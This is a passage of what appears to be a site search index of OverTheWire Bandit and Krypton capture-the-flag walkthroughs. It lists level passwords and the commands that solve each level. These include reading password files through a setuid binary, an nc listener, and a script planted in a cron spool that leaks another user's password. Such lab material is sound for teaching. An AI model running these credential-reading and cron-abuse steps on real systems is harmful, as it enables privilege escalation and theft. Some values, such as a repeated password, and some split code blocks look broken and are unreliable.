</ol>"},{"location":"Over%20The%20Wire/Bandit/%F0%9F%93%98%20Bandit%20Level%205%20%E2%86%92%20Level%206/#password-for-bandit-level-6","title":"\ud83d\udd11 Password for Bandit Level 6:","text":"<pre><code>Z7WtoNQUuWYvwM2RqxqHkUDvZwS2ONQYEw\n</code></pre>"},{"location":"Over%20The%20Wire/Bandit/%F0%9F%93%98%20Bandit%20Level%206%20%E2%86%92%20Level%207/","title":"Level 6 \u2192 7","text":"<p>Challenge URL: Bandit Level 6</p>"},{"location":"Over%20The%20Wire/Bandit/%F0%9F%93%98%20Bandit%20Level%206%20%E2%86%92%20Level%207/#level-goal","title":"\ud83d\udd10 Level Goal:","text":"<p>The password for the next level is stored somewhere on the server and has user bandit7 and group bandit6, and is 33 bytes in size.</p>"},{"location":"Over%20The%20Wire/Bandit/%F0%9F%93%98%20Bandit%20Level%206%20%E2%86%92%20Level%207/#concept","title":"\ud83e\udde0 Concept:","text":"<p>This level teaches:</p> <ul> <li> <p>Deep search using <code>find</code> across entire filesystem</p> </li> <li> <p>Filtering by user, group, and exact file size</p> </li> <li> <p>Using <code>2&gt;/dev/null</code> to silence permission errors</p> </li> </ul>"},{"location":"Over%20The%20Wire/Bandit/%F0%9F%93%98%20Bandit%20Level%206%20%E2%86%92%20Level%207/#steps-to-solve","title":"\ud83d\udee0\ufe0f Steps to Solve:","text":"<ol> <li> <p>SSH into Bandit6:</p> <p><code>bash ssh bandit6@bandit.labs.overthewire.org -p 2220</code></p> </li> <li> <p>Run <code>find</code> with all required filters:</p> <p><code>bash find / -type f -user bandit7 -group bandit6 -size 33c 2&gt;/dev/null</code></p> <p>Output:</p> <p><code>/var/lib/dpkg/info/bandit7.password</code></p> </li> <li> <p>Read the password from the file:</p> <p><code>bash cat /var/lib/dpkg/info/bandit7.password</code></p> <p>Output:</p> <p><code>HKBPTKQnIay4Fw76bEy8PVxKEDQRKTzs</code></p> </li> <li> <p>Exit the session:</p> <p><code>bash exit</code></p> </li> </ol>"},{"location":"Over%20The%20Wire/Bandit/%F0%9F%93%98%20Bandit%20Level%206%20%E2%86%92%20Level%207/#password-for-bandit-level-7","title":"\ud83d\udd11 Password for Bandit Level 7:","text":"<pre><code>HKBPTKQnIay4Fw76bEy8PVxKEDQRKTzs\n</code></pre>"},{"location":"Over%20The%20Wire/Bandit/%F0%9F%93%98%20Bandit%20Level%207%20%E2%86%92%20Level%208/","title":"Level 7 \u2192 8","text":"<p>Challenge URL: Bandit Level 7</p>"},{"location":"Over%20The%20Wire/Bandit/%F0%9F%93%98%20Bandit%20Level%207%20%E2%86%92%20Level%208/#level-goal","title":"\ud83d\udd10 Level Goal:","text":"<p>The password for the next level is stored in the file <code>/etc/bandit_pass/bandit8</code> and can be retrieved by reading the content of a file that contains the password.</p> <p>But here's the twist:</p> <p>You do not know the file name\u2014you only know that it is somewhere in the home directory and contains the word \"millionth\".</p>"},{"location":"Over%20The%20Wire/Bandit/%F0%9F%93%98%20Bandit%20Level%207%20%E2%86%92%20Level%208/#concept","title":"\ud83e\udde0 Concept:","text":"<p>This level focuses on:</p> <ul> <li> <p>Using <code>grep</code> to search inside files</p> </li> <li> <p>Recursively scanning directories</p> </li> </ul>"},{"location":"Over%20The%20Wire/Bandit/%F0%9F%93%98%20Bandit%20Level%207%20%E2%86%92%20Level%208/#steps-to-solve","title":"\ud83d\udee0\ufe0f Steps to Solve:","text":"<ol> <li> <p>SSH into Bandit7:</p> <p><code>bash ssh bandit7@bandit.labs.overthewire.org -p 2220</code></p> </li> <li> <p>Search for the keyword \"millionth\" recursively:</p> <p><code>bash grep -R \"millionth\" .</code></p> <p>Output:</p> <p><code>./data.txt:23r6hFYoRa9NEC0XWnSKKb4t9UQFi7rk</code></p> </li> <li> <p>That's the password! No need to <code>cat</code> \u2014 <code>grep</code> showed the line already.</p> </li> <li> <p>Exit session:</p> <p><code>bash exit</code></p> </li> </ol>"},{"location":"Over%20The%20Wire/Bandit/%F0%9F%93%98%20Bandit%20Level%207%20%E2%86%92%20Level%208/#password-for-bandit-level-8","title":"\ud83d\udd11 Password for Bandit Level 8:","text":"<pre><code>23r6hFYoRa9NEC0XWnSKKb4t9UQFi7rk\n</code></pre>"},{"location":"Over%20The%20Wire/Bandit/%F0%9F%93%98%20Bandit%20Level%208%20%E2%86%92%20Level%209/","title":"Level 8 \u2192 9","text":"<p>Challenge URL: Bandit Level 8</p>"},{"location":"Over%20The%20Wire/Bandit/%F0%9F%93%98%20Bandit%20Level%208%20%E2%86%92%20Level%209/#level-goal","title":"\ud83d\udd10 Level Goal:","text":"<p>The password for the next level is the only line in the file <code>data.txt</code> that occurs only once.</p>"},{"location":"Over%20The%20Wire/Bandit/%F0%9F%93%98%20Bandit%20Level%208%20%E2%86%92%20Level%209/#concept","title":"\ud83e\udde0 Concept:","text":"<p>This level teaches:</p> <ul> <li> <p>Identifying unique lines</p> </li> <li> <p>Using Unix pipelines: <code>sort</code>, <code>uniq -u</code></p> </li> </ul>"},{"location":"Over%20The%20Wire/Bandit/%F0%9F%93%98%20Bandit%20Level%208%20%E2%86%92%20Level%209/#steps-to-solve","title":"\ud83d\udee0\ufe0f Steps to Solve:","text":"<ol> <li> <p>SSH into Bandit8:</p> <p><code>bash ssh bandit8@bandit.labs.overthewire.org -p 2220</code></p> </li> <li> <p>List files and locate <code>data.txt</code>:</p> <p><code>bash ls -alh</code></p> </li> <li> <p>Find the unique line:</p> <p><code>bash cat data.txt | sort | uniq -u</code></p> <p>Output:</p> <p><code>k4CHm1TJ9iJe2PdXgGnvLAa4vxag0J0M</code></p> </li> <li> <p>Logout from the session:</p> <p><code>bash exit</code></p> </li> </ol>"},{"location":"Over%20The%20Wire/Bandit/%F0%9F%93%98%20Bandit%20Level%208%20%E2%86%92%20Level%209/#password-for-bandit-level-9","title":"\ud83d\udd11 Password for Bandit Level 9:","text":"<pre><code>k4CHm1TJ9iJe2PdXgGnvLAa4vxag0J0M\n</code></pre>"},{"location":"Over%20The%20Wire/Bandit/%F0%9F%93%98%20Bandit%20Level%209%20%E2%86%92%20Level%2010/","title":"Level 9 \u2192 10","text":"<p>Challenge URL: Bandit Level 9</p>"},{"location":"Over%20The%20Wire/Bandit/%F0%9F%93%98%20Bandit%20Level%209%20%E2%86%92%20Level%2010/#level-goal","title":"\ud83d\udd10 Level Goal:","text":"<p>The password for the next level is stored in the file <code>data.txt</code> in the home directory. The password is preceded by several <code>=</code> characters.</p>"},{"location":"Over%20The%20Wire/Bandit/%F0%9F%93%98%20Bandit%20Level%209%20%E2%86%92%20Level%2010/#concept","title":"\ud83e\udde0 Concept:","text":"<p>This level introduces:</p> <ul> <li> <p>Handling binary files</p> </li> <li> <p>Using <code>strings</code> to extract printable text</p> </li> <li> <p>Searching for specific patterns using <code>grep</code></p> </li> </ul>"},{"location":"Over%20The%20Wire/Bandit/%F0%9F%93%98%20Bandit%20Level%209%20%E2%86%92%20Level%2010/#steps-to-solve","title":"\ud83d\udee0\ufe0f Steps to Solve:","text":"<ol> <li> <p>SSH into Bandit9:</p> <p><code>bash ssh bandit9@bandit.labs.overthewire.org -p 2220</code></p> </li> <li> <p>Try to <code>cat</code> the file (not helpful due to binary content):</p> <p><code>bash cat data.txt | grep \"=\"</code></p> <p>You'll likely see a warning like:</p> <p><code>grep: binary file matches</code></p> </li> <li> <p>Use <code>strings</code> to extract human-readable content:</p> <p><code>bash strings data.txt | grep \"=\"</code></p> <p>Output:</p> </li> <li> <p>Logout from session:</p> <p><code>bash exit</code></p> </li> </ol>"},{"location":"Over%20The%20Wire/Bandit/%F0%9F%93%98%20Bandit%20Level%209%20%E2%86%92%20Level%2010/#_1","title":"```","text":"<p>the password is FGWmSllgJCBzE3zDE5FYh6t86EZxv3bW =================== ```</p>"},{"location":"Over%20The%20Wire/Bandit/%F0%9F%93%98%20Bandit%20Level%209%20%E2%86%92%20Level%2010/#password-for-bandit-level-10","title":"\ud83d\udd11 Password for Bandit Level 10:","text":"<pre><code>FGWmSllgJCBzE3zDE5FYh6t86EZxv3bW\n</code></pre>"},{"location":"Over%20The%20Wire/Bandit/%F0%9F%93%98Bandit%20Level%2015%20%E2%86%92%20Level%2016/","title":"Level 15 \u2192 16","text":""},{"location":"Over%20The%20Wire/Bandit/%F0%9F%93%98Bandit%20Level%2015%20%E2%86%92%20Level%2016/#challenge-description","title":"\ud83e\udde9 Challenge Description","text":"<p>The password for the next level can be retrieved by submitting the password of the current level to a port on <code>localhost</code> in the range <code>30000 to 31000</code>. You will need to figure out which of these ports contains a server that will give you the next password. The programs <code>openssl</code> and <code>nmap</code> might be helpful here.</p>"},{"location":"Over%20The%20Wire/Bandit/%F0%9F%93%98Bandit%20Level%2015%20%E2%86%92%20Level%2016/#solution-strategy","title":"\ud83e\uddea Solution Strategy","text":"<ol> <li> <p>Read current level's password from the password file:</p> <p><code>bash cat /etc/bandit_pass/bandit15</code></p> </li> <li> <p>Scan open ports from 30000 to 31000 on localhost:</p> <p><code>bash nmap -p 30000-31000 localhost</code></p> </li> <li> <p>Use OpenSSL client to connect to identified SSL-enabled port and send the password:</p> <p><code>bash PASSWORD=$(cat /etc/bandit_pass/bandit15) echo -e \"$PASSWORD\\n\" | openssl s_client -connect localhost:30001 -quiet</code></p> </li> <li> <p>Retrieve the password from the server response.</p> </li> </ol>"},{"location":"Over%20The%20Wire/Bandit/%F0%9F%93%98Bandit%20Level%2015%20%E2%86%92%20Level%2016/#commands-used","title":"\u2705 Commands Used","text":"<pre><code>cat /etc/bandit_pass/bandit15\nPASSWORD=$(cat /etc/bandit_pass/bandit15)\necho -e \"$PASSWORD\\n\" | openssl s_client -connect localhost:30001 -quiet\n</code></pre>"},{"location":"Over%20The%20Wire/Bandit/%F0%9F%93%98Bandit%20Level%2015%20%E2%86%92%20Level%2016/#password-for-bandit16","title":"\ud83d\udd11 Password for Bandit16","text":"<pre><code>kSkVbMQ7lBYyCM4GBPvCvT1BfWRy0Dx\n</code></pre>"},{"location":"Over%20The%20Wire/Bandit/%F0%9F%93%98Bandit%20Level%2016%20%E2%86%92%20Level%2017/","title":"Level 16 \u2192 17","text":""},{"location":"Over%20The%20Wire/Bandit/%F0%9F%93%98Bandit%20Level%2016%20%E2%86%92%20Level%2017/#challenge-description","title":"\ud83e\udde9 Challenge Description","text":"<p>The credentials for the next level are stored in a file called <code>bandit17_rsa</code> in the home directory of the current level. This file is a private SSH key, which can be used to log into <code>bandit17@localhost</code>.</p>"},{"location":"Over%20The%20Wire/Bandit/%F0%9F%93%98Bandit%20Level%2016%20%E2%86%92%20Level%2017/#solution-strategy","title":"\ud83e\uddea Solution Strategy","text":"<ol> <li> <p>Check for the private key file in the home directory:</p> <p><code>bash ls</code></p> </li> <li> <p>Set appropriate permissions for the private key to prevent SSH warnings:</p> <p><code>bash chmod 600 bandit17_rsa</code></p> </li> <li> <p>Use the private key to log into bandit17:</p> <p><code>bash ssh -i bandit17_rsa bandit17@localhost -p 2220</code></p> </li> <li> <p>Retrieve the password for the next level using:</p> <p><code>bash cat /etc/bandit_pass/bandit17</code></p> </li> </ol>"},{"location":"Over%20The%20Wire/Bandit/%F0%9F%93%98Bandit%20Level%2016%20%E2%86%92%20Level%2017/#commands-used","title":"\u2705 Commands Used","text":"<pre><code>chmod 600 bandit17_rsa\nssh -i bandit17_rsa bandit17@localhost -p 2220\ncat /etc/bandit_pass/bandit17\n</code></pre>"},{"location":"Over%20The%20Wire/Bandit/%F0%9F%93%98Bandit%20Level%2016%20%E2%86%92%20Level%2017/#password-for-bandit17","title":"\ud83d\udd11 Password for Bandit17","text":"<pre><code>x2gLTTjFwMOhQ8oWNbNM362QKxfRqGLO\n</code></pre>"},{"location":"Over%20The%20Wire/Bandit/%F0%9F%93%98Bandit%20Level%2017%20%E2%86%92%20Level%2018/","title":"Level 17 \u2192 18","text":""},{"location":"Over%20The%20Wire/Bandit/%F0%9F%93%98Bandit%20Level%2017%20%E2%86%92%20Level%2018/#challenge-description","title":"\ud83e\udde9 Challenge Description","text":"<p>There are two files in the home directory: <code>passwords.old</code> and <code>passwords.new</code>. The password for the next level is the only line that has been changed between the two files.</p>"},{"location":"Over%20The%20Wire/Bandit/%F0%9F%93%98Bandit%20Level%2017%20%E2%86%92%20Level%2018/#solution-strategy","title":"\ud83e\uddea Solution Strategy","text":"<p>To identify the changed line between the two files, we use the <code>diff</code> command:</p> <pre><code>diff passwords.old passwords.new\n</code></pre> <p>This compares both files line by line and displays the difference.</p> <p>The line with <code>&gt;</code> indicates content from <code>passwords.new</code> that is not present in <code>passwords.old</code>, i.e., the newly changed line (the password).</p>"},{"location":"Over%20The%20Wire/Bandit/%F0%9F%93%98Bandit%20Level%2017%20%E2%86%92%20Level%2018/#commands-used","title":"\u2705 Commands Used","text":"<pre><code>diff passwords.old passwords.new\n</code></pre>"},{"location":"Over%20The%20Wire/Bandit/%F0%9F%93%98Bandit%20Level%2017%20%E2%86%92%20Level%2018/#password-for-bandit18","title":"\ud83d\udd11 Password for Bandit18","text":"<pre><code>x2gLTTjFwMOhQ8oWNbNM362QKxfRqGLO\n</code></pre>"},{"location":"Over%20The%20Wire/Bandit/%F0%9F%93%98Bandit%20Level%2018%20%E2%86%92%20Level%2019/","title":"Level 18 \u2192 19","text":""},{"location":"Over%20The%20Wire/Bandit/%F0%9F%93%98Bandit%20Level%2018%20%E2%86%92%20Level%2019/#challenge-description","title":"\ud83e\udde9 Challenge Description","text":"<p>The password for the next level is in a file called <code>readme</code> located in the home directory. However, you are not logged in as bandit18 directly\u2014any command you try to execute will be run remotely via SSH from <code>bandit18</code> user.</p>"},{"location":"Over%20The%20Wire/Bandit/%F0%9F%93%98Bandit%20Level%2018%20%E2%86%92%20Level%2019/#solution-strategy","title":"\ud83e\uddea Solution Strategy","text":"<p>Since we are restricted to using commands remotely via SSH (without an interactive shell), we can use the SSH <code>-p</code> flag along with commands like <code>cat</code> to read the file.</p> <ol> <li> <p>Try listing files remotely (just for confirmation):</p> <p><code>bash ssh bandit18@bandit.labs.overthewire.org -p 2220 'ls'</code></p> </li> <li> <p>Read the <code>readme</code> file remotely:</p> <p><code>bash ssh bandit18@bandit.labs.overthewire.org -p 2220 'cat readme'</code></p> </li> </ol>"},{"location":"Over%20The%20Wire/Bandit/%F0%9F%93%98Bandit%20Level%2018%20%E2%86%92%20Level%2019/#commands-used","title":"\u2705 Commands Used","text":"<pre><code>ssh bandit18@bandit.labs.overthewire.org -p 2220 'cat readme'\n</code></pre>"},{"location":"Over%20The%20Wire/Bandit/%F0%9F%93%98Bandit%20Level%2018%20%E2%86%92%20Level%2019/#password-for-bandit19","title":"\ud83d\udd11 Password for Bandit19","text":"<pre><code>GWpM2hKXVmUDUNgPAVJBwYuGHYn9zL3j8\n</code></pre>"},{"location":"Over%20The%20Wire/Bandit/%F0%9F%93%98Bandit%20Level%2019%20%E2%86%92%20Level%2020/","title":"Level 19 \u2192 20","text":""},{"location":"Over%20The%20Wire/Bandit/%F0%9F%93%98Bandit%20Level%2019%20%E2%86%92%20Level%2020/#challenge-description","title":"\ud83e\udde9 Challenge Description","text":"<p>To gain access to the next level, you must run a setuid binary (<code>bandit20-do</code>) that will execute your command as the <code>bandit20</code> user.</p> <p>You do not have direct access to the <code>bandit20</code> password file, so the binary must be used to read it.</p>"},{"location":"Over%20The%20Wire/Bandit/%F0%9F%93%98Bandit%20Level%2019%20%E2%86%92%20Level%2020/#solution-strategy","title":"\ud83e\uddea Solution Strategy","text":"<ol> <li> <p>List files in the home directory to check the special binary:</p> <p><code>bash ls -alh</code></p> <p>Output:</p> <p><code>-rwsr-x--- 1 bandit20 bandit19 ... bandit20-do</code></p> </li> <li> <p>Use the <code>bandit20-do</code> binary to run <code>cat</code> on the password file for <code>bandit20</code>.</p> </li> <li> <p>The command:</p> <p><code>bash ./bandit20-do cat /etc/bandit_pass/bandit20</code></p> </li> </ol>"},{"location":"Over%20The%20Wire/Bandit/%F0%9F%93%98Bandit%20Level%2019%20%E2%86%92%20Level%2020/#commands-used","title":"\u2705 Commands Used","text":"<pre><code>./bandit20-do cat /etc/bandit_pass/bandit20\n</code></pre>"},{"location":"Over%20The%20Wire/Bandit/%F0%9F%93%98Bandit%20Level%2019%20%E2%86%92%20Level%2020/#password-for-bandit20","title":"\ud83d\udd11 Password for Bandit20","text":"<pre><code>oQXahG8ZjoVMN9Ghs7iOWsCfZyXOUbYO\n</code></pre>"},{"location":"Over%20The%20Wire/Bandit/%F0%9F%93%98Bandit%20Level%2020%20%E2%86%92%20Level%2021/","title":"Level 20 \u2192 21","text":""},{"location":"Over%20The%20Wire/Bandit/%F0%9F%93%98Bandit%20Level%2020%20%E2%86%92%20Level%2021/#challenge-description","title":"\ud83e\udde9 Challenge Description","text":"<p>A program is listening on port XXXX (localhost only) and will give the password for the next level if the right password is sent to it.</p> <p>The previous password is the input it expects.</p>"},{"location":"Over%20The%20Wire/Bandit/%F0%9F%93%98Bandit%20Level%2020%20%E2%86%92%20Level%2021/#solution-strategy","title":"\ud83e\uddea Solution Strategy","text":"<ol> <li> <p>First, start a Netcat listener to inspect how the binary behaves:</p> <p><code>bash nc -lvnp 4444</code></p> </li> <li> <p>Execute the binary <code>suconnect</code> with a port number:</p> <p><code>bash ./suconnect 4444</code></p> <p>On wrong password input, it returns:</p> <p><code>ERROR: This doesn't match the current password!</code></p> </li> <li> <p>Then run with the correct previous password (Bandit20 password):</p> <p><code>bash ./suconnect 4444</code></p> <p>From the <code>nc</code> terminal, input the password:</p> <p><code>oQXahG8ZjoVMN9Ghs7iOWsCfZyXOUbYO</code></p> </li> <li> <p>If correct, you'll get:</p> <p><code>Password matches, sending next password</code></p> </li> </ol>"},{"location":"Over%20The%20Wire/Bandit/%F0%9F%93%98Bandit%20Level%2020%20%E2%86%92%20Level%2021/#commands-used","title":"\u2705 Commands Used","text":"<pre><code>nc -lvnp 4444\n./suconnect 4444\n# Then input: oQXahG8ZjoVMN9Ghs7iOWsCfZyXOUbYO\n</code></pre>"},{"location":"Over%20The%20Wire/Bandit/%F0%9F%93%98Bandit%20Level%2020%20%E2%86%92%20Level%2021/#password-for-bandit21","title":"\ud83d\udd11 Password for Bandit21","text":"<pre><code>EeoULMcra2q0dSKyJ56lDX7s1CpBu0Bt\n</code></pre>"},{"location":"Over%20The%20Wire/Bandit/%F0%9F%93%98Bandit%20Level%2021%20%E2%86%92%20Level%2022/","title":"Level 21 \u2192 22","text":""},{"location":"Over%20The%20Wire/Bandit/%F0%9F%93%98Bandit%20Level%2021%20%E2%86%92%20Level%2022/#challenge-description","title":"\ud83e\udde9 Challenge Description","text":"<p>A cronjob is running every minute on the server as user <code>bandit22</code>. It is copying a password file to a location only readable by bandit22. Your task is to find out where it puts the file, and read it.</p>"},{"location":"Over%20The%20Wire/Bandit/%F0%9F%93%98Bandit%20Level%2021%20%E2%86%92%20Level%2022/#solution-strategy","title":"\ud83e\uddea Solution Strategy","text":"<ol> <li> <p>Go to the cron directory for bandit22:</p> <p><code>bash cd /etc/cron.d</code></p> </li> <li> <p>View the cronjob script:</p> <p><code>bash cat cronjob_bandit22</code></p> <p>Output:</p> <p><code>* * * * * bandit22 /usr/bin/cronjob_bandit22.sh</code></p> </li> <li> <p>Inspect the cron script:</p> <p><code>bash cat /usr/bin/cronjob_bandit22.sh</code></p> <p>Output:</p> <p>```bash</p> </li> <li> <p>Read the password from the temporary file:</p> <p><code>bash cat /tmp/0</code></p> </li> </ol>"},{"location":"Over%20The%20Wire/Bandit/%F0%9F%93%98Bandit%20Level%2021%20%E2%86%92%20Level%2022/#binbash","title":"!/bin/bash","text":"<p>chmod 777 /tmp/0 cat /etc/bandit_pass/bandit22 &gt; /tmp/0 ```</p>"},{"location":"Over%20The%20Wire/Bandit/%F0%9F%93%98Bandit%20Level%2021%20%E2%86%92%20Level%2022/#commands-used","title":"\u2705 Commands Used","text":"<pre><code>cat /etc/cron.d/cronjob_bandit22\ncat /usr/bin/cronjob_bandit22.sh\ncat /tmp/0\n</code></pre>"},{"location":"Over%20The%20Wire/Bandit/%F0%9F%93%98Bandit%20Level%2021%20%E2%86%92%20Level%2022/#password-for-bandit22","title":"\ud83d\udd11 Password for Bandit22","text":"<pre><code>GbKksEFF4yrVs6il55v6gwY5aVje5f0j\n</code></pre>"},{"location":"Over%20The%20Wire/Bandit/%F0%9F%93%98Bandit%20Level%2022%20%E2%86%92%20Level%2023/","title":"Level 22 \u2192 23","text":""},{"location":"Over%20The%20Wire/Bandit/%F0%9F%93%98Bandit%20Level%2022%20%E2%86%92%20Level%2023/#challenge-description","title":"\ud83e\udde9 Challenge Description","text":"<p>A cronjob is running every minute on the server as user <code>bandit23</code>. It executes a script that looks in a specific directory for new files, executes them, and deletes them afterward.</p> <p>Your task is to place a script in that directory which outputs the password for Bandit23 into a file you can read.</p>"},{"location":"Over%20The%20Wire/Bandit/%F0%9F%93%98Bandit%20Level%2022%20%E2%86%92%20Level%2023/#solution-strategy","title":"\ud83e\uddea Solution Strategy","text":"<ol> <li> <p>View the cron job:</p> <p><code>bash cat /etc/cron.d/cronjob_bandit23</code></p> <p>Output:</p> <p><code>* * * * * bandit23 /usr/bin/cronjob_bandit23.sh</code></p> </li> <li> <p>Read the cronjob script:</p> <p><code>bash cat /usr/bin/cronjob_bandit23.sh</code></p> <p>Output:</p> <p>```bash</p> </li> <li> <p>Create a script inside <code>/var/spool/bandit22/</code>:</p> <p><code>bash echo 'cat /etc/bandit_pass/bandit23 &gt; /tmp/shaunpass' &gt; /var/spool/bandit22/my_script.sh chmod +x /var/spool/bandit22/my_script.sh</code></p> </li> <li> <p>Wait 1 minute, then read the output:</p> <p><code>bash cat /tmp/shaunpass</code></p> </li> </ol>"},{"location":"Over%20The%20Wire/Bandit/%F0%9F%93%98Bandit%20Level%2022%20%E2%86%92%20Level%2023/#binbash","title":"!/bin/bash","text":"<p>for i in /var/spool/bandit22/*; do     bash \"$i\" 2&gt;/dev/null     rm -f \"$i\" done ```</p>"},{"location":"Over%20The%20Wire/Bandit/%F0%9F%93%98Bandit%20Level%2022%20%E2%86%92%20Level%2023/#commands-used","title":"\u2705 Commands Used","text":"<pre><code>echo 'cat /etc/bandit_pass/bandit23 &gt; /tmp/shaunpass' &gt; /var/spool/bandit22/my_script.sh\nchmod +x /var/spool/bandit22/my_script.sh\ncat /tmp/shaunpass\n</code></pre>"},{"location":"Over%20The%20Wire/Bandit/%F0%9F%93%98Bandit%20Level%2022%20%E2%86%92%20Level%2023/#password-for-bandit23","title":"\ud83d\udd11 Password for Bandit23","text":"<pre><code>jbYICExggBDSA5XESyphPTQ9L7ZgWn1i\n</code></pre>"},{"location":"Over%20The%20Wire/Bandit/%F0%9F%93%98Bandit%20Level%2023%20%E2%86%92%20Level%2024/","title":"Level 23 \u2192 24","text":"<p>Awesome! Here's the final writeup for this batch:</p>"},{"location":"Over%20The%20Wire/Bandit/%F0%9F%93%98Bandit%20Level%2023%20%E2%86%92%20Level%2024/#challenge-description","title":"\ud83e\udde9 Challenge Description","text":"<p>A program is running automatically at regular intervals from <code>cron</code>, as user <code>bandit24</code>. It deletes all scripts in a specific directory (<code>/var/spool/bandit24</code>) and executes only one script \u2014 <code>/usr/bin/cronjob_bandit24.sh</code>.</p> <p>Your task is to read the script, understand what it does, and leak the password from <code>/etc/bandit_pass/bandit24</code>.</p>"},{"location":"Over%20The%20Wire/Bandit/%F0%9F%93%98Bandit%20Level%2023%20%E2%86%92%20Level%2024/#solution-strategy","title":"\ud83e\uddea Solution Strategy","text":"<ol> <li> <p>Check the cron job definition:</p> <p><code>bash cat /etc/cron.d/cronjob_bandit24</code></p> <p>Output:</p> <p><code>* * * * * bandit24 /usr/bin/cronjob_bandit24.sh</code></p> </li> <li> <p>Read the cron job script:</p> <p><code>bash cat /usr/bin/cronjob_bandit24.sh</code></p> <p>Output:</p> <p>```bash</p> </li> <li> <p>Understand that the script generates a hash based on:</p> <p><code>bash echo \"I am user bandit24\" | md5sum</code></p> <p>Output:</p> <p><code>9a2c8e5d6ecbdedd312be69ed170fcdb</code></p> </li> <li> <p>Use the hash to read the password file:</p> <p><code>bash cat /tmp/9a2c8e5d6ecbdedd312be69ed170fcdb</code></p> </li> </ol>"},{"location":"Over%20The%20Wire/Bandit/%F0%9F%93%98Bandit%20Level%2023%20%E2%86%92%20Level%2024/#binbash","title":"!/bin/bash","text":"<p>myname=$(whoami) mytarget=$(echo I am user $myname | md5sum | cut -d ' ' -f1) echo \"Copying passwordfile /etc/bandit_pass/$myname to /tmp/$mytarget\" cp /etc/bandit_pass/$myname /tmp/$mytarget ```</p>"},{"location":"Over%20The%20Wire/Bandit/%F0%9F%93%98Bandit%20Level%2023%20%E2%86%92%20Level%2024/#commands-used","title":"\u2705 Commands Used","text":"<pre><code>echo \"I am user bandit24\" | md5sum\ncat /tmp/9a2c8e5d6ecbdedd312be69ed170fcdb\n</code></pre>"},{"location":"Over%20The%20Wire/Bandit/%F0%9F%93%98Bandit%20Level%2023%20%E2%86%92%20Level%2024/#password-for-bandit24","title":"\ud83d\udd11 Password for Bandit24","text":"<pre><code>UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ\n</code></pre>"},{"location":"Over%20The%20Wire/Krypton/%F0%9F%94%90%20Krypton%20Level%202%20%E2%86%92%20Level%203/","title":"Level 2 \u2192 3","text":"<p>Challenge URL: Krypton Level 2</p>"},{"location":"Over%20The%20Wire/Krypton/%F0%9F%94%90%20Krypton%20Level%202%20%E2%86%92%20Level%203/#level-goal","title":"\ud83c\udfaf Level Goal:","text":"<p>The password for <code>krypton3</code> is stored in the file <code>/krypton/krypton2/krypton3</code>, encrypted using a Caesar cipher \u2014 a basic letter-shifting technique.</p>"},{"location":"Over%20The%20Wire/Krypton/%F0%9F%94%90%20Krypton%20Level%202%20%E2%86%92%20Level%203/#concept","title":"\ud83d\udcda Concept:","text":"<p>In this level, you\u2019ll practice:</p> <ul> <li> <p>Decrypting a Caesar Cipher</p> </li> <li> <p>Brute-forcing 26 rotations (shifts)</p> </li> <li> <p>Recognizing meaningful output from a decoded string</p> </li> </ul>"},{"location":"Over%20The%20Wire/Krypton/%F0%9F%94%90%20Krypton%20Level%202%20%E2%86%92%20Level%203/#steps-to-solve","title":"\ud83d\udee0\ufe0f Steps to Solve:","text":"<ol> <li> <p>SSH into Krypton Level 2:</p> <p><code>bash ssh krypton2@krypton.labs.overthewire.org -p 2222</code></p> <p>Password: <code>ROTTEN</code></p> </li> <li> <p>Read the encrypted file:</p> <p><code>bash cat /krypton/krypton2/krypton3</code></p> <p>Output:</p> <p><code>OMQEMDUEQMEK</code></p> </li> <li> <p>Use Python to brute-force Caesar shift:</p> <p>```python import string</p> <p>charset = string.ascii_uppercase enc = \"OMQEMDUEQMEK\"</p> <p>for k in range(26):     dec = \"\"     for c in enc:         if c in charset:             idx = charset.find(c)             idx = (idx + k) % 26             dec += charset[idx]         else:             dec += c     print(f\"{k:02d}: {dec}\") ```</p> <p>One of the outputs will be:</p> <p><code>12: CAESARISEASY</code></p> </li> <li> <p>Logout once you get the password:</p> <p><code>bash exit</code></p> </li> </ol>"},{"location":"Over%20The%20Wire/Krypton/%F0%9F%94%90%20Krypton%20Level%202%20%E2%86%92%20Level%203/#password-for-krypton-level-3","title":"\ud83d\udddd\ufe0f Password for Krypton Level 3:","text":"<pre><code>CAESARISEASY\n</code></pre>"},{"location":"Over%20The%20Wire/Krypton/%F0%9F%A7%A0%20Krypton%20Level%206%20%E2%86%92%20Level%207/","title":"Level 6 \u2192 7","text":"<p>Challenge URL: Krypton Level 6</p>"},{"location":"Over%20The%20Wire/Krypton/%F0%9F%A7%A0%20Krypton%20Level%206%20%E2%86%92%20Level%207/#level-goal","title":"\ud83c\udfaf Level Goal:","text":"<p>The password for <code>krypton7</code> is encrypted using a stream cipher. You\u2019re provided a compiled binary (<code>encrypt6</code>) that encrypts input using a repeating key + random seed, and the original ciphertext is already known.</p>"},{"location":"Over%20The%20Wire/Krypton/%F0%9F%A7%A0%20Krypton%20Level%206%20%E2%86%92%20Level%207/#concept","title":"\ud83e\udde0 Concept:","text":"<p>This level introduces:</p> <ul> <li> <p>The concept of stream ciphers</p> </li> <li> <p>Performing a known plaintext attack</p> </li> <li> <p>Observing pattern repetitions to deduce encryption weaknesses</p> </li> </ul>"},{"location":"Over%20The%20Wire/Krypton/%F0%9F%A7%A0%20Krypton%20Level%206%20%E2%86%92%20Level%207/#steps-to-solve","title":"\ud83d\udee0\ufe0f Steps to Solve:","text":"<ol> <li> <p>SSH into Krypton Level 6:</p> <p><code>bash ssh krypton6@krypton.labs.overthewire.org -p 2222</code></p> <p>Password: <code>RANDOM</code></p> </li> <li> <p>Navigate to the directory:</p> <p><code>bash cd /krypton/krypton6/ ls</code></p> <p>Files available:</p> <p><code>HINT1  HINT2  README  encrypt6  keyfile.dat  krypton7  onetime</code></p> </li> <li> <p>View the encrypted password:</p> <p><code>bash cat krypton7</code></p> <p>Output:</p> <p><code>PNUKLYLWRQKGKBE</code></p> </li> <li> <p>Generate test ciphertext with known plaintext:</p> <p>Create a plaintext of repeating characters and encrypt it:</p> <p><code>bash python3 -c \"print('A'*100)\" &gt; /tmp/plain.txt ./encrypt6 /tmp/plain.txt /tmp/cipher.txt cat /tmp/cipher.txt</code></p> <p>Output:</p> <p><code>EICTDGYIYZKTHNSIRFXYCPFUEOCKRN...</code></p> <p>Notice the repeated 30-character pattern \u2014 the stream cipher\u2019s key repeats every 30 bytes!</p> </li> <li> <p>Repeat with another character (e.g., <code>'B'</code>) to verify offset change:</p> <p><code>bash python3 -c \"print('B'*100)\" &gt; /tmp/plain2.txt ./encrypt6 /tmp/plain2.txt /tmp/cipher2.txt cat 